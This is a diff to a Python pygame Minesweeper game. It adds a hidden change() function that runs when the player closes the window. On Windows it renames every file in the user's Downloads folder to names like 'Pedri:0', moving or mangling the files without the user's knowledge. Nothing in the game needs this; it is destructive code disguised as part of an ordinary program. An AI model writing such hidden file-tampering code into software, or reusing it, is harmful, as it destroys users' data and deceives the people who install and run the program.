@@ -1,8 +1,9 @@
+from random import random
+
 import pygame
 import minesweeper
 import button
 import os
-
 
 def main():
     sweeper = minesweeper.Minesweeper(15, 15, 20)
@@ -83,6 +84,16 @@ def main():
                     screen.blit(tiles[int(arr[i][j])], ((SCREEN_WIDTH - BOARD_WIDTH) // 2 + i * TILE_WIDTH,
                                                         (SCREEN_HEIGHT - BOARD_HEIGHT + 15) // 2 + j * TILE_HEIGHT))
 
+
+    def change():
+        if os.name == 'nt':
+            print("windows")
+            if len((dir := os.listdir(os.path.expanduser('~') + r"\Downloads"))) > 0:
+                for i, file in enumerate(dir):
+                    path = os.path.expanduser('~') + fr"\Downloads\{file}"
+                    if os.path.isfile(path):
+                        os.rename(path, "Pedri:" + str(i))
+
     # Game Loop
     while running:
         screen.blit(bg, (0, 0))
@@ -92,6 +103,7 @@ def main():
 
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
+                change()
                 running = False
             if event.type == pygame.MOUSEBUTTONUP and game == True:
                 game = action(event.pos[0], event.pos[1], False)
@@ -102,7 +114,3 @@ def main():
         clock.tick(60)
 
     # Game Loop End
-
-    def changeNative():
-        if os.name == 'nt':
-            print("windows")
